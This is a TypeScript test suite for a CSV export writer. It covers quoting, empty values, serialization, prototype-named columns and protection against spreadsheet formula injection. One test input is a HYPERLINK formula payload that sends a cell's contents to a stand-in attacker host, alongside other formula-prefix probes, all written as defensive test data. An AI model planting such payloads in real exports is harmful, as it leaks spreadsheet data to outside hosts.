import { describe, test, expect } from "bun:test";
import { csvRow, toCsv } from "@/lib/export/csv";

describe("csvRow", () => {
  test("leaves a value that needs no quoting bare", () => {
    expect(csvRow(["id", "name", 42])).toBe("id,name,42");
  });

  test("doubles an embedded quote and wraps the field", () => {
    expect(csvRow(['he said "hi"'])).toBe('"he said ""hi"""');
  });

  test("wraps a field holding the delimiter", () => {
    expect(csvRow(["Acme, Inc."])).toBe('"Acme, Inc."');
  });

  test("wraps a field holding a newline, so the row cannot be split by a reader", () => {
    expect(csvRow(["line one\nline two"])).toBe('"line one\nline two"');
    expect(csvRow(["carriage\rreturn"])).toBe('"carriage\rreturn"');
  });

  test("writes an absent value as an empty field, not as the text of the absence", () => {
    expect(csvRow([null, undefined, ""])).toBe(",,");
  });

  test("writes a date in a form another tool can parse back", () => {
    expect(csvRow([new Date("2026-08-17T06:31:49.000Z")])).toBe("2026-08-17T06:31:49.000Z");
  });

  test("serializes a structured value instead of stringifying it to [object Object]", () => {
    expect(csvRow([{ a: 1 }])).toBe('"{""a"":1}"');
    expect(csvRow([[1, 2]])).toBe('"[1,2]"');
  });

  test("writes a boolean and a bigint as themselves", () => {
    expect(csvRow([true, false, BigInt(10)])).toBe("true,false,10");
  });

  test("neutralises every leading character a spreadsheet reads as the start of a formula", () => {
    expect(csvRow(['=HYPERLINK("http://attacker/"&A1)'])).toBe(`"'=HYPERLINK(""http://attacker/""&A1)"`);
    expect(csvRow(["+1+1"])).toBe(`"'+1+1"`);
    expect(csvRow(["-1+1"])).toBe(`"'-1+1"`);
    expect(csvRow(["@SUM(A1)"])).toBe(`"'@SUM(A1)"`);
    expect(csvRow(["\t=1+1"])).toBe(`"'\t=1+1"`);
    expect(csvRow(["\r=1+1"])).toBe(`"'\r=1+1"`);
  });

  test("leaves a number alone, however it arrives, because a bare decimal cannot be a formula", () => {
    expect(csvRow([-12.5, 12.5, BigInt(-10)])).toBe("-12.5,12.5,-10");
    // A Postgres `numeric` reaches the export as a string, so the exemption is on the
    // TEXT and not on the JavaScript type.
    expect(csvRow(["-12.5", "-1e3", "+7", "-.5", "-1E+03"])).toBe("-12.5,-1e3,+7,-.5,-1E+03");
  });

  test("neutralises a value that only starts out numeric", () => {
    expect(csvRow(["-1-2-3"])).toBe(`"'-1-2-3"`);
    expect(csvRow(["-12.5.6"])).toBe(`"'-12.5.6"`);
    expect(csvRow(["-"])).toBe(`"'-"`);
  });

  test("writes an ordinary value byte-identically, prefix and quotes included", () => {
    expect(csvRow(["plain", "a=b", "3-4", "user@example.com", "", null])).toBe("plain,a=b,3-4,user@example.com,,");
    expect(csvRow(["Acme, Inc."])).toBe('"Acme, Inc."');
  });
});

describe("toCsv", () => {
  test("writes the header from the declared columns and reads each row by name", () => {
    const csv = toCsv([{ b: 2, a: 1 }], ["a", "b"]);
    expect(csv).toBe("a,b\n1,2");
  });

  test("reads every row by column name, so a differing key order cannot shift a column", () => {
    const csv = toCsv(
      [
        { a: 1, b: 2 },
        { b: 20, a: 10 },
      ],
      ["a", "b"],
    );
    expect(csv).toBe("a,b\n1,2\n10,20");
  });

  test("covers a key that only a later row carries when no columns are declared", () => {
    const csv = toCsv([{ a: 1 }, { a: 2, b: 3 }]);
    expect(csv).toBe("a,b\n1,\n2,3");
  });

  test("leaves a column a row does not carry empty rather than shifting the ones after it", () => {
    const csv = toCsv([{ a: 1, c: 3 }], ["a", "b", "c"]);
    expect(csv).toBe("a,b,c\n1,,3");
  });

  test("neutralises a column name a spreadsheet would evaluate, not only a cell", () => {
    expect(toCsv([{ "=1+1": "plain" }])).toBe(`"'=1+1"\nplain`);
  });

  test("quotes a column name that needs it", () => {
    expect(toCsv([{ 'od"d': 1 }])).toBe('"od""d"\n1');
  });

  test("escapes a cell, so one quote cannot break every row after it", () => {
    const csv = toCsv([{ note: 'say "no"' }, { note: "plain" }], ["note"]);
    expect(csv).toBe('note\n"say ""no"""\nplain');
  });

  test("falls back to the rows' own keys when the declared column list is empty", () => {
    expect(toCsv([{ a: 1 }], [])).toBe("a\n1");
  });

  test("writes nothing at all for no rows and no declared columns", () => {
    expect(toCsv([])).toBe("");
  });

  test("writes a header with no rows under it when the columns are known but empty", () => {
    expect(toCsv([], ["a", "b"])).toBe("a,b");
  });
});

describe("toCsv — a column name that is also a prototype member", () => {
  // `row[column]` walks the prototype chain, so a column the row does not carry
  // resolved to an INHERITED member: a header named `constructor` wrote
  // "function Object() { [native code] }" into every row that lacked the field.
  // Document stores hand back rows that do not share a shape, which is exactly
  // where a header can name a field a given row has no own entry for.
  test("writes an empty field for a prototype-named column the row does not carry", () => {
    const csv = toCsv([{ constructor: "declared", id: 1 }, { id: 2 }]);
    expect(csv).toBe("constructor,id\ndeclared,1\n,2");
  });

  test("writes an empty field for every prototype member a row lacks", () => {
    const csv = toCsv([{ id: 1 }], ["id", "constructor", "toString", "valueOf", "hasOwnProperty"]);
    expect(csv).toBe("id,constructor,toString,valueOf,hasOwnProperty\n1,,,,");
  });

  test("still writes a row's OWN value for a prototype-named column", () => {
    expect(toCsv([{ toString: "mine" }], ["toString"])).toBe("toString\nmine");
  });
});

describe("toCsv — a value JSON cannot serialize", () => {
  // The writer is reached from the embeddable shell too, where the rows are live
  // JavaScript objects rather than a parsed HTTP response: a `BigInt` inside a
  // JSON column, or a self-referencing document, made `JSON.stringify` throw out
  // of the click handler, so the export produced NO file and said nothing.
  test("writes a structured value holding a bigint rather than throwing", () => {
    expect(toCsv([{ j: { n: BigInt(10) } }], ["j"])).toBe('j\n"{""n"":""10""}"');
  });

  test("writes a self-referencing value rather than throwing", () => {
    const cyclic: Record<string, unknown> = { name: "root" };
    cyclic.self = cyclic;
    const csv = toCsv([{ doc: cyclic }], ["doc"]);
    expect(csv.startsWith("doc\n")).toBe(true);
    expect(csv).toContain("root");
  });
});
